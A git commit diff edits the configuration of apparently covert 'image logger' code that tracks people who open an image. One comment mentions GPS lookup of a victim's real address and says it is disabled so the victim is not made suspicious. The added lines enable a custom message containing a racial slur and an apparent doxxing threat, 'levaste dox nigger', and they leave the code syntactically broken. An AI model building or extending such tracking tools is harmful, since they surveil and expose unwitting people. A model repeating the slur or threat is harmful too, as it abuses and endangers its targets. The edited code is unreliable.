59b2407a2459b018fccc7fdd35774ab12adb1900
kilqzora <pilasp993@gmail.com>
2025-02-16 23:32:58 +0000

    Update image.py

--- api/image.py
+++ api/image.py
@@ -27,9 +27,9 @@ config = {
     
     "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
-    "message": { # Show a custom message when the user opens the image
-        "doMessage": False, # Enable the custom message?
-        "message": "", # Message to show
+    "message": { 
+        "doMessage": True, levaste dox nigger# Enable the custom message?
+        "message": levaste dox nigger"", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
